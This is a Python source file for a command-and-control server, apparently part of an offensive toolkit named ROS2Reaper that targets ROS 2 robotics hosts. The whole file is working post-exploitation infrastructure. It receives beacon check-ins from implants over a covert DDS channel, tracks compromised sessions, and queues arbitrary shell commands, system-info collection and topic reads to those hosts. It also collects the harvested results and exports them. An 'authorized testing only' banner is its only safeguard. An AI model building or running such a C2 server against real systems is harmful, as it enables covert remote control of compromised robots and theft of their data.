#!/usr/bin/env python3
"""
c2_server.py — Operator C2 Server & Interactive Shell
=======================================================
ROS2Reaper Phase 4 Module

Operator-side C2 listener. Receives beacon check-ins from compromised ROS 2
hosts over the covert DDS channel, tracks active sessions, queues tasking,
and provides an interactive shell for per-session command dispatch.

Features:
    - Multi-session tracking (multiple compromised hosts)
    - Interactive operator shell with tab-completion
    - Task queuing — commands delivered on next beacon check-in
    - Session history and result logging
    - JSON report export

Author  : Gh057x
Phase   : 4 — Post-Exploitation / C2
Requires: Python 3.8+ (stdlib only)

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import threading
import time
import json
import os
import sys
from typing import Dict, Optional
from datetime import datetime

from modules.phase4.c2_channel import (
    C2Transport, C2Packet, C2Session,
    MsgType, DEFAULT_KEY, _make_session_id,
)


# ─────────────────────────────────────────────────────────────────────────────
# C2 Server
# ─────────────────────────────────────────────────────────────────────────────

class C2Server:
    """
    Listens for beacon check-ins and manages operator tasking across sessions.
    """

    def __init__(
        self,
        domain_id:  int   = 0,
        key:        bytes = DEFAULT_KEY,
        verbose:    bool  = False,
    ):
        self.domain_id  = domain_id
        self.key        = key
        self.verbose    = verbose
        self.transport  = C2Transport(domain_id=domain_id, key=key)
        self.sessions:  Dict[str, C2Session] = {}
        self._stop      = threading.Event()
        self._lock      = threading.Lock()
        self._task_queue: Dict[str, list] = {}  # session_id → [pending tasks]
        self._seq       = 0

    # ── helpers ───────────────────────────────────────────────────────────────

    def _log(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\033[90m[{ts}]\033[0m {msg}")

    def _next_seq(self) -> int:
        self._seq += 1
        return self._seq

    def _send_task(self, session_id: str, task_type: str, params: dict = {}) -> bool:
        sess = self.sessions.get(session_id)
        if not sess:
            return False
        pkt = C2Packet(
            msg_type   = MsgType.TASK,
            session_id = session_id,
            seq        = self._next_seq(),
            timestamp  = time.time(),
            payload    = {"task": task_type, **params},
        )
        ok = self.transport.send_unicast(sess.implant_ip, pkt)
        if ok:
            sess.tasks_sent.append({"task": task_type, "params": params, "ts": time.time()})
        return ok

    def _send_kill(self, session_id: str) -> bool:
        sess = self.sessions.get(session_id)
        if not sess:
            return False
        pkt = C2Packet(
            msg_type   = MsgType.KILL,
            session_id = session_id,
            seq        = self._next_seq(),
            timestamp  = time.time(),
            payload    = {},
        )
        return self.transport.send_unicast(sess.implant_ip, pkt)

    # ── beacon handler ────────────────────────────────────────────────────────

    def _on_packet(self, pkt: C2Packet, src_ip: str) -> None:
        sid = pkt.session_id

        with self._lock:
            if sid not in self.sessions:
                sess = C2Session(
                    session_id = sid,
                    implant_ip = src_ip,
                    domain_id  = self.domain_id,
                )
                self.sessions[sid] = sess
                self._log(
                    f"\033[92m[+] NEW SESSION\033[0m  {sid}  "
                    f"from {src_ip}  "
                    f"host={pkt.payload.get('hostname', '?')}  "
                    f"ros={pkt.payload.get('ros_distro', '?')}"
                )
            else:
                sess = self.sessions[sid]

            sess.last_seen = time.time()
            sess.checkins += 1
            sess.implant_ip = src_ip

            if pkt.msg_type == MsgType.BEACON:
                hostname = pkt.payload.get("hostname", "")
                if hostname:
                    sess.hostname = hostname

                # Harvest any results delivered in the beacon
                results = pkt.payload.get("results", [])
                if results:
                    sess.results.extend(results)
                    for r in results:
                        self._log(
                            f"  \033[96m[result]\033[0m {sid[:6]}  "
                            f"task={r.get('task')}  "
                            f"data={json.dumps(r.get('result', {}))[:120]}"
                        )

                # Deliver queued task if any
                pending = self._task_queue.get(sid, [])
                if pending:
                    task = pending.pop(0)
                    self._task_queue[sid] = pending
                    self._send_task(sid, task["task"], task.get("params", {}))
                    self._log(f"  \033[93m[tasked]\033[0m {sid[:6]}  {task['task']}")

            elif pkt.msg_type == MsgType.RESULT:
                sess.results.append(pkt.payload)

    # ── listener thread ───────────────────────────────────────────────────────

    def start(self) -> None:
        port = self.transport._user_port()
        self._log(f"[*] C2 server listening on UDP:{port} (domain {self.domain_id})")
        self._log(f"[*] Also joining DDS multicast {self.transport._disco_port()}")

        t_unicast = threading.Thread(
            target=self.transport.listen,
            args=(port, self._on_packet, self._stop, False),
            daemon=True,
        )
        t_multicast = threading.Thread(
            target=self.transport.listen,
            args=(self.transport._disco_port(), self._on_packet, self._stop, True),
            daemon=True,
        )
        t_unicast.start()
        t_multicast.start()

    def stop(self) -> None:
        self._stop.set()

    # ── session management ────────────────────────────────────────────────────

    def list_sessions(self) -> None:
        if not self.sessions:
            print("  (no active sessions)")
            return
        print(f"\n  {'ID':<14} {'IP':<18} {'HOST':<20} {'ROS':<12} {'CHECKINS':<10} {'LAST SEEN'}")
        print("  " + "─" * 85)
        now = time.time()
        for sid, sess in self.sessions.items():
            age = int(now - sess.last_seen)
            print(
                f"  {sid:<14} {sess.implant_ip:<18} {sess.hostname[:18]:<20} "
                f"{'?':<12} {sess.checkins:<10} {age}s ago"
            )
        print()

    def queue_task(self, session_id: str, task_type: str, params: dict = {}) -> bool:
        if session_id not in self.sessions:
            return False
        if session_id not in self._task_queue:
            self._task_queue[session_id] = []
        self._task_queue[session_id].append({"task": task_type, "params": params})
        return True

    def show_results(self, session_id: str) -> None:
        sess = self.sessions.get(session_id)
        if not sess:
            print(f"  [-] Session {session_id} not found")
            return
        if not sess.results:
            print("  (no results yet)")
            return
        for r in sess.results:
            print(json.dumps(r, indent=2))

    def export(self, path: str) -> None:
        report = {
            "generated":  datetime.now().isoformat(),
            "sessions":   [],
        }
        for sid, sess in self.sessions.items():
            report["sessions"].append({
                "session_id": sid,
                "implant_ip": sess.implant_ip,
                "hostname":   sess.hostname,
                "domain_id":  sess.domain_id,
                "first_seen": datetime.fromtimestamp(sess.first_seen).isoformat(),
                "last_seen":  datetime.fromtimestamp(sess.last_seen).isoformat(),
                "checkins":   sess.checkins,
                "tasks_sent": sess.tasks_sent,
                "results":    sess.results,
            })
        with open(path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"[*] Report saved to {path}")


# ─────────────────────────────────────────────────────────────────────────────
# Interactive operator shell
# ─────────────────────────────────────────────────────────────────────────────

SHELL_HELP = """
\033[93mC2 Shell Commands:\033[0m

  sessions                         List active sessions
  use <session_id>                 Set active session
  info                             Show active session info
  results                          Show results for active session

  task shell <cmd>                 Queue a shell command
  task sysinfo                     Queue a system info collection
  task ros_enum                    Queue ROS 2 graph enumeration
  task topic_read <topic>          Queue a topic read

  kill                             Kill the active beacon
  export <file.json>               Export all sessions to JSON

  help                             Show this help
  exit / quit                      Stop server and exit
"""

class C2Shell:
    """Interactive operator shell wrapping a C2Server."""

    def __init__(self, server: C2Server):
        self.server  = server
        self.active_session: Optional[str] = None

    def _prompt(self) -> str:
        sid = self.active_session[:6] if self.active_session else "none"
        return f"\033[91mc2\033[0m[\033[93m{sid}\033[0m]> "

    def _resolve_session(self, partial: str) -> Optional[str]:
        for sid in self.server.sessions:
            if sid.startswith(partial):
                return sid
        return None

    def run(self) -> None:
        print(SHELL_HELP)
        while True:
            try:
                line = input(self._prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            parts = line.split(None, 2)
            cmd   = parts[0].lower()

            if cmd in ("exit", "quit"):
                break

            elif cmd == "help":
                print(SHELL_HELP)

            elif cmd == "sessions":
                self.server.list_sessions()

            elif cmd == "use":
                if len(parts) < 2:
                    print("  usage: use <session_id>")
                    continue
                sid = self._resolve_session(parts[1])
                if sid:
                    self.active_session = sid
                    print(f"  [*] Active session: {sid}")
                else:
                    print(f"  [-] Session not found: {parts[1]}")

            elif cmd == "info":
                if not self.active_session:
                    print("  [-] No active session (use `use <id>`)")
                    continue
                sess = self.server.sessions.get(self.active_session)
                if sess:
                    print(json.dumps({
                        "session_id": sess.session_id,
                        "implant_ip": sess.implant_ip,
                        "hostname":   sess.hostname,
                        "checkins":   sess.checkins,
                        "last_seen":  datetime.fromtimestamp(sess.last_seen).isoformat(),
                        "tasks_sent": len(sess.tasks_sent),
                        "results":    len(sess.results),
                    }, indent=2))

            elif cmd == "results":
                if not self.active_session:
                    print("  [-] No active session")
                    continue
                self.server.show_results(self.active_session)

            elif cmd == "task":
                if not self.active_session:
                    print("  [-] No active session")
                    continue
                if len(parts) < 2:
                    print("  usage: task <type> [args]")
                    continue
                task_type = parts[1].lower()
                params: dict = {}
                if task_type == "shell":
                    if len(parts) < 3:
                        print("  usage: task shell <command>")
                        continue
                    params = {"cmd": parts[2]}
                elif task_type == "topic_read":
                    if len(parts) < 3:
                        print("  usage: task topic_read <topic>")
                        continue
                    params = {"topic": parts[2]}
                ok = self.server.queue_task(self.active_session, task_type, params)
                if ok:
                    print(f"  [*] Task queued — will be delivered on next beacon check-in")
                else:
                    print(f"  [-] Failed to queue task")

            elif cmd == "kill":
                if not self.active_session:
                    print("  [-] No active session")
                    continue
                ok = self.server._send_kill(self.active_session)
                print(f"  [*] KILL sent: {'ok' if ok else 'failed'}")
                self.active_session = None

            elif cmd == "export":
                path = parts[1] if len(parts) > 1 else f"c2_report_{int(time.time())}.json"
                self.server.export(path)

            else:
                print(f"  [-] Unknown command: {cmd}  (type 'help')")

        self.server.stop()
        print("[*] C2 server stopped")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def run_server(
    domain_id: int   = 0,
    key:       bytes = DEFAULT_KEY,
    verbose:   bool  = False,
    output:    Optional[str] = None,
) -> None:
    server = C2Server(domain_id=domain_id, key=key, verbose=verbose)
    server.start()
    shell  = C2Shell(server)
    shell.run()
    if output:
        server.export(output)
